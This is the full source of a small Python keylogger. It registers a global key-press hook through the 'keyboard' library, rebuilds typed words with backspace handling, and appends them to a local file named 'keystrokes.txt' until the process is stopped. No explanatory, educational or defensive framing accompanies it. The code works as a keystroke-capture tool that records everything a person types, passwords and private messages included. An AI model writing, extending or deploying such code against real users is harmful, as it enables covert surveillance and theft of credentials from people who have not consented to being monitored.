import keyboard

log_file = 'keystrokes.txt'
buffer = ""  # Temporary buffer to store typed characters

# Function to handle key presses
def on_key_press(event):
    global buffer
    if event.name == "space":  # Space indicates the end of a word
        buffer += " "
        save_to_file(buffer)
        buffer = ""  # Reset the buffer
    elif event.name == "enter":  # Enter key indicates the end of a line
        buffer += "\n"
        save_to_file(buffer)
        buffer = ""  # Reset the buffer
    elif event.name == "backspace":  # Handle backspace
        buffer = buffer[:-1]  # Remove last character in the buffer
    elif len(event.name) == 1:  # Add normal characters to the buffer
        buffer += event.name

# Function to save the buffer to the log file
def save_to_file(text):
    with open(log_file, 'a') as f:
        f.write(text)

# Listen for keyboard events
keyboard.on_press(on_key_press)
keyboard.wait()
